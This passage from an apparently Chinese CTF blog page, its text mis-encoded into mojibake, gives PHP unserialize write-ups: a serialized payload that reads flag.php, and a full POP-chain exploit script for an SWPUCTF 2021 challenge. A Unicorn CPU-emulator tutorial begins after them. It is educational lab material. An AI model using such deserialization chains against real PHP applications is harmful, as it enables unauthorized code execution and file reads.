      <p>è¿™ä¸ªä½¿ç”¨<code>php7.1+</code>é’ˆå¯¹æˆå‘˜å±æ€§ä¸æ•æ„Ÿçš„ç‰¹æ€§ï¼Œå³åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å…¶æ­£å¸¸çš„<code>protected</code>æˆå‘˜ä¼šæœ‰<code>\00*\00</code>æ¥ä¿®é¥°ï¼Œä½†æ˜¯è¿™é‡Œä¸å…è®¸ä¼ å…¥<code>\00</code>ï¼Œé‚£å°±ä¸ä¼ å…¥ã€‚è¿™ä¸ª<code>php7.1+</code>çš„ç‰¹æ€§å…è®¸åœ¨æ²¡æœ‰ä¿®é¥°çš„æ—¶å€™ï¼Œä¹Ÿèƒ½è¿›è¡Œè½¬æ¢ï¼Œä¸ç®¡æ˜¯<code>private</code>è¿˜æ˜¯<code>protected</code>ã€‚ä½†æ˜¯<code>php7.1</code>ä»¥ä¸‹åˆ™ä¸è¡Œï¼Œä¼šå°†ç›¸å…³çš„å˜é‡ç½®ä¸º<code>null</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä»è€Œæ— æ³•åˆ©ç”¨ã€‚</p>
<p>è‡³äºåé¢çš„å¤šå‡ºæ¥çš„å±æ€§æ˜¯æ€ä¹ˆå›äº‹ï¼Œå°±ä¸å¤ªçŸ¥é“äº†ï¼Œä¼°è®¡æ˜¯<code>php</code>åº•å±‚ä»£ç é—®é¢˜</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220726173826850.png" alt="image-20220726173826850"></p>

        <h2 id="æ¡ä»¶äºŒ"   >
          <a href="#æ¡ä»¶äºŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¡ä»¶äºŒ" class="headerlink" title="æ¡ä»¶äºŒ"></a>æ¡ä»¶äºŒ</h2>
      <p>å¯ä»¥æ³¨æ„åˆ°ç¬¬ä¸€æ¬¡åœ¨<code>__destruct</code>ä¸­æ¯”è¾ƒ<code>op</code>ç”¨çš„æ˜¯å¼ºæ¯”è¾ƒ<code>===</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></div></figure>

<p>è€Œç¬¬äºŒæ¬¡åœ¨<code>process</code>å‡½æ•°ä¸­ç”¨çš„æ˜¯å¼±æ¯”è¾ƒ<code>==</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå°±å¯ä»¥ä½¿å¾—<code>op</code>ä¸º<code>int</code>å‹çš„<code>2</code>ï¼Œè¿™æ ·å³å¯å¦‚ä¸‹ç»“æœ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;op === &quot;2&quot;) 		ä¸ºFalse</span><br><span class="line">if($this-&gt;op == &quot;1&quot;)		ä¸ºFalse</span><br><span class="line">else if($this-&gt;op == &quot;2&quot;)	ä¸ºTrue</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå³å¯é¡ºåˆ©è·³åˆ°æ‰“å°<code>filename</code>çš„åœ°æ–¹</p>
<p>æ¡ä»¶ä¸‰å°±ä¸ç”¨è¯´äº†ï¼Œå¯¹åº”èµ‹å€¼å³å¯ï¼Œæœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>flag</code>åœ¨æ³¨é‡Šé‡Œã€‚</p>

        <h1 id="äºŒåå››ã€-SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"   >
          <a href="#äºŒåå››ã€-SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåå››ã€-SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="äºŒåå››ã€[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>äºŒåå››ã€[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/2857028-20220517191534625-963175506.png" alt="2857028-20220517191534625-963175506"></p>

        <h2 id="ğŸ”ºPHPçš„POPé“¾"   >
          <a href="#ğŸ”ºPHPçš„POPé“¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPçš„POPé“¾" class="headerlink" title="ğŸ”ºPHPçš„POPé“¾"></a>ğŸ”ºPHPçš„POPé“¾</h2>
      
        <h2 id="1-æ¼æ´åˆ†æ"   >
          <a href="#1-æ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ¼æ´åˆ†æ" class="headerlink" title="1.æ¼æ´åˆ†æ"></a>1.æ¼æ´åˆ†æ</h2>
      <p>ç›´æ¥ç»™äº†æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>åªè¦è°ƒç”¨åˆ°<code>w33m-&gt;__toString</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•äº†ã€‚</p>

        <h2 id="2-æ¼æ´åˆ©ç”¨"   >
          <a href="#2-æ¼æ´åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h2>
      <p>é‚£ä¹ˆå°±æ˜¯<code>POP</code>é“¾äº†ï¼Œå°±æ˜¯å€Ÿç”¨<code>PHP</code>ååºåˆ—çš„æ—¶å€™è°ƒç”¨çš„å„ç§é­”æœ¯æ–¹æ³•ï¼Œä¸²è”èµ·æ¥ï¼Œç±»ä¼¼<code>JAVA</code>çš„ååºåˆ—åŒ–ï¼Œè¿™é‡Œçš„é“¾å­å³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w22m-&gt;__destruct()</span><br><span class="line">echo $this-&gt;w00m</span><br><span class="line">w33m-&gt;__toString()ä¸‹çš„$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br></pre></td></tr></table></div></figure>

<p>å³è®¾ç½®<code>$this-&gt;w22m</code>ä¸º<code>Getflag</code>ï¼Œ<code>$this-&gt;w00m</code>ä¸º<code>w44m</code>çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œå³å¦‚ä¸‹</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> w22m();</span><br><span class="line"><span class="variable">$obj</span>-&gt;w00m = <span class="keyword">new</span> w33m();</span><br><span class="line"><span class="variable">$obj</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> w44m();</span><br><span class="line"><span class="variable">$obj</span>-&gt;w00m-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="æ³¨ï¼š"   >
          <a href="#æ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h2>
      <ul>
<li><p>ååºåˆ—<code>unserialize</code>åªä¼šè°ƒç”¨åˆ°ä¼ å…¥å¯¹è±¡çš„<code>__destruct</code>ï¼Œè€Œä¸ä¼šè°ƒç”¨å…¶æˆå‘˜å‡½æ•°çš„<code>__destruct</code></p>
</li>
<li><p>å‡½æ•°è°ƒç”¨çš„ç‰¹æ®Šå†™æ³•</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;myTest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c33</span> = <span class="keyword">new</span> w33m();</span><br><span class="line"><span class="variable">$c33</span>-&gt;w22m = <span class="keyword">new</span> w44m();</span><br><span class="line"><span class="variable">$c33</span>-&gt;w00m = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$c33</span>-&gt;w22m-&gt;&#123;<span class="variable">$c33</span>-&gt;w00m&#125;(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>å³å¯ä»¥ä½¿ç”¨<code>$c33-&gt;w22m-&gt;&#123;$c33-&gt;w00m&#125;(&quot;aaa&quot;,&quot;bbb&quot;);</code>è¿™ç§æ–¹å¼æ¥è°ƒç”¨æŸä¸ªç±»çš„æ–¹æ³•ã€‚</p>
</li>
</ul>

        <h1 id="äºŒåäº”ã€-RoarCTF-2019-Easy-Java"   >
          <a href="#äºŒåäº”ã€-RoarCTF-2019-Easy-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåäº”ã€-RoarCTF-2019-Easy-Java" class="headerlink" title="äºŒåäº”ã€[RoarCTF 2019]Easy Java"></a>äºŒåäº”ã€[RoarCTF 2019]Easy Java</h1>
      <p>æ‰“å¼€æ˜¯ç™»å½•ç•Œé¢ï¼ŒæŸ¥çœ‹helpï¼Œå‘ç°URLæœ‰ç‚¹é—®é¢˜</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230530184715317.png" alt="image-20230530184715317"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/19/Unicorn/">Unicorn</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€åŠŸèƒ½ä»‹ç»"   >
          <a href="#ä¸€ã€åŠŸèƒ½ä»‹ç»" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€åŠŸèƒ½ä»‹ç»" class="headerlink" title="ä¸€ã€åŠŸèƒ½ä»‹ç»"></a>ä¸€ã€åŠŸèƒ½ä»‹ç»</h1>
      
        <h2 id="1-åˆå§‹åŒ–"   >
          <a href="#1-åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆå§‹åŒ–" class="headerlink" title="1.åˆå§‹åŒ–"></a>1.åˆå§‹åŒ–</h2>
      
        <h3 id="1-å‰ç½®æ¨¡å—åŠæ¶æ„"   >
          <a href="#1-å‰ç½®æ¨¡å—åŠæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®æ¨¡å—åŠæ¶æ„" class="headerlink" title="(1)å‰ç½®æ¨¡å—åŠæ¶æ„"></a>(1)å‰ç½®æ¨¡å—åŠæ¶æ„</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br></pre></td></tr></table></div></figure>

<p><code>unicorn.x86_const</code>è¿™ä¸ªæ¨¡å—æ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œå¯ä»¥æ¢æˆä»¥ä¸‹å¤šç§æ¶æ„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211118211823.png" alt="image-20211118211823271"></p>

        <h3 id="2-mainå‡½æ•°åˆå§‹åŒ–"   >
          <a href="#2-mainå‡½æ•°åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-mainå‡½æ•°åˆå§‹åŒ–" class="headerlink" title="(2)mainå‡½æ•°åˆå§‹åŒ–"></a>(2)mainå‡½æ•°åˆå§‹åŒ–</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Emulate amd64 code&quot;</span>)</span><br><span class="line">uc = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">binary = <span class="string">&quot;./binary&quot;</span></span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0</span></span><br><span class="line">CODE = BASE + <span class="number">0x0</span></span><br><span class="line">CODE_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mov r8,0x123</span></span><br><span class="line"><span class="comment"># mov r9,0x456</span></span><br><span class="line">CODE_DATA = <span class="string">b&quot;\x49\xc7\xc0\x23\x01\x00\x00&quot;</span> + <span class="string">b&quot;\x49\xc7\xc1\x56\x04\x00\x00&quot;</span></span><br><span class="line"><span class="comment">#CODE_DATA = getCODEFromBinary(binary)</span></span><br><span class="line"></span><br><span class="line">STACK = <span class="number">0x7F00000000</span></span><br><span class="line">STACK_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">FS = <span class="number">0x7FF0000000</span></span><br><span class="line">FS_SIZE = <span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆå§‹åŒ–UC</span></span><br><span class="line">initUC(uc,CODE,CODE_SIZE, STACK, STACK_SIZE)</span><br></pre></td></tr></table></div></figure>

<p><code>UC_ARCH_X86</code>ï¼šä»£è¡¨x86æ¶æ„</p>
<p><code>UC_MODE_64</code>ï¼šä»£è¡¨64ä½</p>
<p><code>UC_MODE_32</code>ï¼šä»£è¡¨32ä½</p>
<p><code>CODE</code>ï¼šè¡¨ç¤ºè£…è½½è¿›å…¥å†…å­˜çš„ä»£ç æ•°æ®åœ°å€</p>
<p><code>CODE_DATA</code>ï¼šè¡¨ç¤ºè‡ªå®šä¹‰çš„ä»£ç æˆ–è€…ä»binaryä¸­è·å–çš„ç›¸å…³ä»£ç æ•°æ®</p>
<p><code>STACK</code>ï¼šè¡¨æ ˆçš„æ•°æ®åœ°å€</p>

        <h3 id="3-å…¶ä»–åˆå§‹åŒ–"   >
          <a href="#3-å…¶ä»–åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…¶ä»–åˆå§‹åŒ–" class="headerlink" title="(3)å…¶ä»–åˆå§‹åŒ–"></a>(3)å…¶ä»–åˆå§‹åŒ–</h3>
      
        <h4 id="â‘ å†…å­˜åˆå§‹åŒ–"   >
          <a href="#â‘ å†…å­˜åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å†…å­˜åˆå§‹åŒ–" class="headerlink" title="â‘ å†…å­˜åˆå§‹åŒ–"></a>â‘ å†…å­˜åˆå§‹åŒ–</h4>
      <p>æ ˆå’Œä»£ç æ•°æ®ï¼Œå‘CODEä¸­å†™å…¥CODE_DATA</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–ä¸€å—å†…å­˜ç”¨æ¥ä¿å­˜ç¨‹åºçš„æ‰€æœ‰æ•°æ®</span></span><br><span class="line">uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL)</span><br><span class="line">uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)</span><br><span class="line">uc.mem_write(CODE, CODE_DATA)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å¯„å­˜å™¨åˆå§‹åŒ–"   >
          <a href="#â‘¡å¯„å­˜å™¨åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å¯„å­˜å™¨åˆå§‹åŒ–" class="headerlink" title="â‘¡å¯„å­˜å™¨åˆå§‹åŒ–"></a>â‘¡å¯„å­˜å™¨åˆå§‹åŒ–</h4>
      <p>åœ¨initUCä¸­è¢«è°ƒç”¨</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initReg</span>(<span class="params">uc,STACK=<span class="number">0x7F00000000</span>,RAX_DATA=<span class="number">0</span>,RBX_DATA=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            RCX_DATA=<span class="number">0</span>,RDX_DATA=<span class="number">0</span>,RSI_DATA=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            RDI_DATA=<span class="number">0</span>,R8_DATA=<span class="number">0</span>,R9_DATA=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            R10_DATA=<span class="number">0</span>,R11_DATA=<span class="number">0</span>,R12_DATA=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            R13_DATA=<span class="number">0</span>,R14_DATA=<span class="number">0</span>,R15_DATA=<span class="number">0</span></span>):</span></span><br><span class="line">    uc.reg_write(UC_X86_REG_RAX, RAX_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RBX, RBX_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RCX, RCX_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RDX, RDX_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RSI, RSI_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RDI, RDI_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R8, R8_DATA)</span><br><span class="line">    